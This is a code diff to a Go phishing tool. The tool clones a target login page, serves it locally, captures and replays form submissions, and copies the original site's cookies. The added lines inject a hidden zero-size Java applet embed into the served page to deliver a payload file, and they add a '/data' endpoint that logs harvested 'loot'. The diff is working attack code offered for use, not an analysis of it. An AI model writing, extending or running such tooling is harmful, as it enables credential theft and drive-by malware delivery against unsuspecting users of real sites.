@@ -7,7 +7,9 @@
 	# Opt:	-t	Sets the target URL
 	#
 	# Opt:	-s	Start a web server and serve the modified page, then when input is entered,
-				gather the data and retransmit the request to the original page
+	#			gather the data and retransmit the request to the original page
+	#
+	# Opt:	-e	Embed a payload in the HTML
 
 	#######################################################################################
 
@@ -37,11 +39,16 @@ import (
 var (
 	target     string
 	serverMode bool
+	embedFileName string
+	embedData []byte
+	embedClass string
 )
 
 func init() {
 	flag.StringVar(&target, "t", "", "You must enter a target URL")
-	flag.BoolVar(&serverMode, "s", false, "You must indicate server mode")
+	flag.BoolVar(&serverMode, "s", false, "Server mode")
+	flag.StringVar(&embedFileName, "e", "", "Embed target file")
+	flag.StringVar(&embedClass, "c", "", "Embed class")
 }
 
 // get base page
@@ -73,11 +80,13 @@ func retouch(originalHTML string) string {
 	return output
 }
 
+// extract the action paramiter of a form
 func getAction(form string) string {
 	formTagParts := strings.Split(form, "action=\"")
 	return strings.Split(formTagParts[1], "\"")[0]
 }
 
+// change form names to base64 encoded strings to avoid conflicts
 func fixForms(page string) string {
 	for _, form := range findForms(page) {
 		action := getAction(form)
@@ -87,6 +96,7 @@ func fixForms(page string) string {
 	return page
 }
 
+// extract all form tags from the HTML
 func findForms(page string) []string {
 	formRgx := regexp.MustCompile(`<form .+>`)
 	return formRgx.FindAllString(string(page), -1)
@@ -100,9 +110,36 @@ func findForms(page string) []string {
 	###################################################
 */
 
+func embedObj(w http.ResponseWriter, r *http.Request) {
+	if len(embedData) > 0 {
+		io.WriteString(w, string(embedData))
+	} else {
+		io.WriteString(w, "ERR")
+	}
+}
+
+func logLoot(w http.ResponseWriter, r *http.Request) {
+	err := r.ParseForm()
+	if err != nil {
+		log.Fatal(err)
+	}
+	loot, err := url.QueryUnescape(r.FormValue("data"))
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(loot)
+
+	io.WriteString(w, "") // return a blank 200
+}
+
 func srvIndex(w http.ResponseWriter, r *http.Request) {
 	// get cookies from the original site
 	cookies, page := shutter()
+	/*
+		*NOTE*
+		None of this cookie shit works in newer browsers
+		due to point of origin rules.
+	*/
 	for _, cookie := range cookies {
 		// explicitly set the domain of each cookie
 		if cookie.Domain == "" {
@@ -113,7 +150,13 @@ func srvIndex(w http.ResponseWriter, r *http.Request) {
 			cookie.Domain = urlObj.Host
 		}
 		http.SetCookie(w, cookie)
-		fmt.Println(cookie.Raw)
+		//fmt.Println(cookie.Raw)
+	}
+
+	// add embed if appropriate
+	if len(embedFileName) > 0 {
+		embedTxt := `<embed type="application/x-java-applet;version=1.6" width="0" height="0" archive="` + embedFileName + `" code="` + embedClass + `"/></body>`
+		page = strings.Replace(string(page), `</body>`,embedTxt, -1)
 	}
 
 	// show poloroid
@@ -196,6 +239,22 @@ func main() {
 	http.HandleFunc("/", srvIndex)
 	for _, form := range findForms(poloroid) {
 		http.HandleFunc("/"+base64.StdEncoding.EncodeToString([]byte(getAction(form))), collect)
+	}
+
+	// build reporting URLs
+	http.HandleFunc("/data", logLoot)
+
+	// if embed flag is set
+	if len(embedFileName) > 0 {
+		// load embed target if present
+		var err error
+		embedData, err = ioutil.ReadFile(embedFileName)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		// build embed handle
+		http.HandleFunc(`/` + embedFileName, embedObj)
 	}
 
 	// start web server
